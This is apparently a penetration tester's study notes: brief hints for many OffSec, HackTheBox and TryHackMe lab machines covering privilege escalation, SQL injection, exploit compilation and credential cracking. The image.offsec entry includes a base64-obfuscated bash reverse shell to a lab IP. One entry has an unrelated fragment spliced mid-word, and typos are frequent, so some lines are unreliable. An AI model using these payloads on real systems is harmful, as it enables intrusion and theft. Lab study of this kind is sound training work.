...
#### squid.offsec
  squid proxy, to interact with inner ports; phpmyadmin uploader by admin user; nt authority\local service, restricted user restore priv
...
#### pre-oscp tells OpenSSH to only use the identity (key) files explicitly specified via the -i flag 
...
http://192.168.205.55/shenzi/wp-admin/theme-editor.php?file=index.php&theme=twentytwenty
#### Devie.thm
...
#### bastion.htb
  smbclient with guest get baebDAV Enabled on IIS (Port 80) — Primary Targetckup image of OS; use mountto mount folder remote to local; guestmount --add the vhd file to view locally; get NTLM hash of users; john crack it; enumerate saftwre installed, google it , find the vuln of insexure credential stored; github srcipt to decript the password of Admin
...
#### office.paper
  use burp to get response header - domainname; wordpress version vunl, infor leakage, to a new app; help of robot, run command to read unpriv files , get a credential; use to ssh a user; polkit version nul to ESLevram
...
#### Exfiltrated.offsec
  exiftool for Privi Escalate

#### AuthBy.pgp
  i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32

#### access.offsec
  .htaccess to add php as upload file whitelist; get SPN hash; /priv, write priv to C:\ systeminfo to trigger C:\Windows\system32\wbem\tzres.dll

#### Craft.offsec
  create Macros payload, icacls, SeImpersonatePrivilege to root

#### hutch.offsec
  webdav for web shell; SeImpersonatePrivilege

#### heist.offsec
  set responder to get info from AD http service; find sMSA account using ldapsearch, and use bloodhound to find priv of ReadGMSAPassword, read hash of target account; SeRestorePrivileges to ES.

#### boolean.offsec
  /?cwd=xxx for an LFI; sh -o "IdentitiesOnly=yes",  might pass repeated auth failures 

#### cohort.htb
  SSRF, and no literal string check bypass; dpkg -l | grep packagekit, check dpkg packeagekit, may have vuln

#### cockpit.offsec
  admin' and 1=1 -- - ; tar with wildcard

#### clue.offsec
  sudo mount -t cifs -o username=user,password=pass //server-ip/share /mnt/smb, mount smb to local to search; grep -rn;

#### DVR4.offsec
  sensitive files in Windows worhty to be included, like .ssh in Windows.

#### Levram.offsec
  check source and error of vuln to make it work; python3.10 cap_setuid=ep to PE

#### hepet.offsec
  SMTP user veify; IMAP enumerate; set rev shell into odt ods files; send email using swaks; check system service to Priv ES; create xx.c file and complie it into.exe revv shell;

#### Extplorer.offsec
  .htuser to get hash of user; group disk to Priv es

#### vault.offsec AD
  SMB upload privi to get hash of user; SeRestorePrivilege SeShutdownPrivilege to PRIV escalate; check group members; bloodhound get generalWrite to GPO - Default Domain Policy

#### shenzi.offsec
   windows Priv Es AlwaysInstallElevated  set to 1 in HKLM!  set to 1 in HKCU!
#### image.offsec
  make base64 reverse shell to bypass filter  L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMjQ0Lzg4MjEgMD4mMQo= | base64 -d | bash; trace with SUID

#### smarthire.htb
  Priv Es: python .pth file path injection;
